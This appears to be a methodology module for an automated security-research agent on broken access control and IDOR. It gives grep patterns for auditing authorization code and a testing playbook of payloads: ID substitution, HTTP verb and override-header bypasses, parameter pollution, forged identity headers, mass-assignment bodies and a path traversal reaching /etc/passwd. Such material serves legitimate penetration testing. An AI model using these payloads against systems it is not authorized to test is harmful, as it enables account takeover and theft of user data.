# VULN MODULE — Broken Access Control (BAC / IDOR)
# Asset: webapp
# CWE-639 (IDOR), CWE-284 (BAC), CWE-269 (Privilege Escalation)
# Report prefix: WEB

## THREAT MODEL

Broken access control occurs when the server fails to enforce *who can do what*.
Unlike authentication flaws (broken login), BAC assumes a valid session and tests
whether the authorization check itself is missing, bypassable, or inconsistent.

Three distinct failure types:
  HORIZONTAL  — user A accesses user B's resources (same privilege level)
  VERTICAL    — low-privilege user accesses high-privilege functionality
  CONTEXT     — resource is accessible in one context but not another,
                and that distinction is not enforced

Authorization model types to map before testing:
  RBAC (Role-Based)      — check which roles exist and how they're assigned
  ABAC (Attribute-Based) — check which request attributes gate access
  DAC  (Discretionary)   — check if resource owners can inadvertently grant access

---

## WHITEBOX GREP PATTERNS

### Authorization checks — find them first, then find endpoints that skip them
```bash
# PHP / WordPress
grep -rn "current_user_can\|user_can\|has_permission\|can_access\|is_admin\|is_super_admin" --include="*.php"
grep -rn "authorize(\|Gate::allows\|Gate::denies\|policy(" --include="*.php"     # Laravel
grep -rn "@can\|@cannot\|@role\|@hasrole" --include="*.php"                      # Blade directives
grep -rn "check_admin_referer\|check_ajax_referer\|wp_verify_nonce" --include="*.php"

# Node.js
grep -rn "req\.user\|req\.role\|req\.permissions\|req\.isAuthenticated" --include="*.js" --include="*.ts"
grep -rn "hasRole\|hasPermission\|can(\|cannot(\|isAdmin\|isAuthorized" --include="*.js" --include="*.ts"
grep -rn "Roles\.\|Permissions\.\|ACL\.\|RBAC\." --include="*.js" --include="*.ts"

# Python (Django / Flask)
grep -rn "@login_required\|@permission_required\|@staff_member_required" --include="*.py"
grep -rn "user\.has_perm\|user\.is_staff\|user\.is_superuser" --include="*.py"
grep -rn "@roles_required\|@admin_required\|current_user\." --include="*.py"

# Java (Spring)
grep -rn "@PreAuthorize\|@Secured\|@RolesAllowed\|hasRole\|hasAuthority" --include="*.java"
grep -rn "SecurityContextHolder\|Authentication\|getAuthorities" --include="*.java"
```

### Find object references (IDOR candidates)
```bash
# PHP
grep -rn "\$_GET\['id'\]\|\$_POST\['id'\]\|\$_REQUEST\['id'\]\|\$_GET\['user" --include="*.php"
grep -rn "\$_GET\['order\|\$_GET\['invoice\|\$_GET\['account\|\$_GET\['file" --include="*.php"

# Node.js
grep -rn "req\.params\.\|req\.query\.\|req\.body\." --include="*.js" --include="*.ts" | \
  grep -E "id|user|account|order|invoice|file|document|record"

# Django
grep -rn "request\.GET\.get\|request\.POST\.get\|kwargs\['pk'\]\|kwargs\['id'\]" --include="*.py"

# Identify DB lookups using user-controlled ID WITHOUT ownership check
grep -rn "findById\|find_by_id\|findOne\|get_object_or_404\|Model\.find(" --include="*.js" --include="*.ts"
grep -rn "WHERE id =\|WHERE user_id =\|WHERE order_id =" --include="*.php" --include="*.py"
# CRITICAL: does the query include AND user_id = $current_user?
```

### HTTP method routing — find endpoints that may not check all verbs
```bash
# Express.js — look for app.get() that performs state changes
grep -rn "app\.get(\|router\.get(" --include="*.js" --include="*.ts" | \
  grep -E "delete|remove|update|modify|change|set|disable|enable|reset"

# PHP — look for state-change logic reachable via GET
grep -rn "\$_SERVER\['REQUEST_METHOD'\]\|if.*GET\|if.*POST" --include="*.php"

# Spring — look for @GetMapping doing mutations
grep -rn "@GetMapping\|@RequestMapping.*GET" --include="*.java" | head -50

# Find endpoints with no method restriction (catch-all routes)
grep -rn "app\.all(\|router\.all(\|Route::any(" --include="*.js" --include="*.ts" --include="*.php"
```

### Static keyword aliases — find "me", "current", "self", "my"
```bash
grep -rn '"me"\|"current"\|"self"\|"my"\|/me/\|/current/\|/self/' \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.php" --include="*.java"
grep -rn "'me'\|'current'\|'self'" \
  --include="*.php" --include="*.py"
# Check: does the alias resolution ONLY use the session user, or does it accept a fallback param?
```

### Multi-step workflow — identify state transitions
```bash
# Find multi-step forms / checkout / verification flows
grep -rn "step\|wizard\|stage\|phase\|confirm\|verify\|checkout\|onboard" \
  --include="*.js" --include="*.ts" --include="*.php" --include="*.py" -i | \
  grep -v "node_modules\|vendor\|test"
# For each flow: does each step re-verify the previous step was completed?
# Can you POST step 3 without having completed step 2?
```

### Second-order access control — internal API proxying
```bash
# PHP: user input forwarded to internal curl / file_get_contents
grep -rn "file_get_contents.*\$_\|curl_setopt.*\$_\|CURLOPT_URL.*\$_" --include="*.php"

# Node.js: user input passed to internal http/fetch call
grep -rn "fetch(.*req\.\|axios.*req\.\|http\.get.*req\." --include="*.js" --include="*.ts"

# Python: user param in requests.get/post
grep -rn "requests\.get.*request\.\|requests\.post.*request\." --include="*.py"

# Check: does the internal service trust the forwarded request with elevated credentials?
# Pattern: gateway authenticates as service account, forwards user-supplied ID to backend
```

### JWT / token claim authorization
```bash
# Find where JWT claims are used for access decisions
grep -rn "\.role\|\.roles\|\.permissions\|\.scope\|\.tenant_id\|\.org_id\|\.sub" \
  --include="*.js" --include="*.ts" | grep -v "^Binary"
grep -rn "token\[.role.\]\|payload\[.role.\]\|claims\[.role.\]\|decoded\.role" \
  --include="*.js" --include="*.ts"
# Check: are these claims verified server-side or trusted blindly from client-supplied token?
```

---

## TESTING PLAYBOOK

### 1. IDOR — Horizontal Privilege Escalation

**Setup**: Two accounts at the same privilege level (attacker A, victim B).

```bash
# Step 1: As attacker, record your resource IDs
GET /api/v1/users/1001/profile          # your profile
GET /api/v1/orders/8820                 # your order

# Step 2: Substitute victim's ID
GET /api/v1/users/1002/profile          # victim's profile
GET /api/v1/orders/8821                 # victim's order

# Step 3: Test write operations
PUT /api/v1/users/1002/profile          # modify victim's profile
DELETE /api/v1/orders/8821              # delete victim's order

# Step 4: Test via body parameters (not just URL)
POST /api/v1/transfer
{"from_account": "1001", "to_account": "attacker_account"}
# Try: change from_account to victim's account ID
```

**ID formats to probe:**
```
Numeric sequential:   1337 → 1338, 1336
UUIDv1 (time-based):  extract timestamp, generate nearby values
Predictable hashes:   md5(username), sha1(email+timestamp)
Encoded IDs:          base64decode then modify, re-encode
```

### 2. HTTP Method Matching — Verb Bypass

```bash
# If endpoint rejects with 401/403, try every method
for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo "=== $METHOD ==="
  curl -s -o /dev/null -w "%{http_code}" -X $METHOD \
    -H "Authorization: Bearer $TOKEN" \
    https://target.com/api/admin/users
  echo
done

# Method override headers (some frameworks honor these)
curl -X POST https://target.com/api/admin/users \
  -H "X-HTTP-Method-Override: GET" \
  -H "X-Method-Override: GET" \
  -H "X-Override-Method: GET" \
  -d "_method=GET"

# If GET has weaker auth than POST, use GET to perform reads
# If DELETE has no auth check, use it even if PUT is protected
```

### 3. HTTP Parameter Pollution (HPP) — Authorization Check Confusion

The authorization layer may validate parameter[0] while the application uses parameter[1].

```bash
# Duplicate parameter (comma-separated)
GET /api/orders?userId=9999,1337        # check if 9999 (your ID) passes auth, 1337 fetched

# Multiple instances in query string
GET /api/orders?userId=9999&userId=1337

# Mixed encoding
GET /api/orders?userId=1337%00          # null byte suffix
GET /api/orders?userId=1337%0A          # CRLF
GET /api/orders?userId=%31%33%33%37     # URL-encoded
GET /api/orders?userId=1337%20          # trailing space

# Wildcard / boolean confusion
GET /api/orders?userId=*
GET /api/orders?userId=true
GET /api/orders?userId=null
GET /api/orders?userId=undefined

# Array notation (PHP, some frameworks expand these)
GET /api/orders?userId[]=1337
GET /api/orders?userId[0]=9999&userId[1]=1337
```

### 4. Static Keyword Replacement

```bash
# Applications use aliases like "me", "current", "self", "my"
GET /api/users/me/profile
GET /api/users/current/settings
GET /api/profile/my/data

# Attempt: replace with actual user ID or admin ID
GET /api/users/1/profile              # your own ID
GET /api/users/2/profile              # another user's ID (IDOR)
GET /api/users/admin/profile          # admin account

# Some apps resolve "me" via session but allow ID override via a param
GET /api/users/me/profile?userId=1337
GET /api/users/me/profile?id=1337
GET /api/users/me/profile?user_id=1337

# Mixed: alias in path, actual ID in body
PATCH /api/users/me/settings
{"user_id": 1337, "email": "attacker@evil.com"}
```

### 5. Second-Order / Indirect Access Control

**Pattern A: Path traversal in forwarded internal request**
```bash
# If app forwards userId to an internal API:
# Normal:  GET /proxy/user?id=1337  → internal: GET /internal/users/1337
# Attack:  GET /proxy/user?id=../admin/config
#          → internal: GET /internal/users/../admin/config (path traversal)

# Variants
?id=../1338                # neighboring resource
?id=../../admin            # vertical escalation
?id=1337/../../../etc/passwd  # if internal service is filesystem-backed
```

**Pattern B: Session poisoning via password reset**
```bash
# If forgot-password sets a session variable that is ALSO used in the login check:
# 1. Victim is logged in as user A
# 2. Attacker triggers forgot-password for admin account (same browser context via CSRF)
# 3. forgot-password handler overwrites session variable (e.g. session['user_id'] = admin_id)
#    before the reset email is sent
# 4. Victim's session is now admin

# Reproduce: open two browser tabs, trigger the race condition
```

**Pattern C: Middleware using service token instead of user token**
```bash
# If a gateway service authenticates ITSELF to backends (not forwarding the user token):
# Inject a user ID that the backend won't verify independently
POST /api/gateway/execute
X-Forwarded-User: admin
X-User-ID: 1
X-Original-User: admin@target.com
X-Real-User-ID: 1337

# Backend trusts the gateway, so it processes the request as the injected user
```

### 6. Vertical Privilege Escalation — Role/Permission Bypass

```bash
# Test admin endpoints directly as low-privilege user
GET /admin/users
GET /admin/config
GET /api/v1/admin/statistics
POST /api/v1/admin/create-user

# Look for endpoints that check role on the FRONTEND only
# (common in SPA apps — React/Vue/Angular routing ≠ server authorization)
# Intercept the API call the admin UI makes and replay it as low-priv user

# Parameter-based role escalation
POST /api/user/update
{"role": "admin"}          # mass assignment attempt
{"isAdmin": true}
{"permissions": ["*"]}
{"subscription": "enterprise"}

# Role in JWT claim — decode and modify
# If the JWT contains {"role": "user"}, modify to {"role": "admin"} and re-sign
# (see auth_bypass.md for JWT attack details)
```

### 7. Multi-Step Workflow Authorization Bypass

```bash
# Map the expected flow:
# Step 1: /checkout/cart        (low priv)
# Step 2: /checkout/shipping    (requires step 1)
# Step 3: /checkout/payment     (requires step 2)
# Step 4: /checkout/confirm     (requires step 3)

# Skip steps: POST directly to confirm without completing payment
# Repeat steps: replay a completed payment step to trigger duplicate actions
# Cross-account: complete step 1 as user A, switch session to user B, complete step 4

# Archive/transfer patterns:
# If "archive" changes resource ownership or access level:
# 1. Create resource as user A
# 2. Archive as user A → ownership transferred to "archive" service account
# 3. As user B, access the archived resource (now owned by service account with open ACL)
```

---

## IMPACT CLASSIFICATION

Always demonstrate **real** data access, not theoretical:

| Impact | Minimum Evidence Required |
|--------|--------------------------|
| Critical | Full account takeover, PII of all users accessible, admin RCE chain |
| High | Another user's PII (name, email, address, payment method); write to other's data |
| Medium | Non-sensitive data of other users; limited data exposure |
| Low | Metadata only (e.g., user exists); non-sensitive business data |
| Informative | Your own data via different path; public data via undocumented API |

**Out of scope (do not report):**
- Session swapping between your own two accounts
- Accessing data already public (just via an undocumented API path)
- Theoretical chains requiring attacker to already have the victim's password

---

## AUTO-LOAD TRIGGERS

The researcher agent should load this module automatically when:
- `current_user_can` / `hasRole` / `@PreAuthorize` detected in source → BAC likely present
- REST API with numeric/UUID IDs in path segments detected
- `/admin/` or `/api/admin/` routes found with low-privilege account test available
- Multi-step form/checkout/workflow detected
- Internal API proxying (`X-Forwarded-*`, internal fetch with user-supplied ID) detected
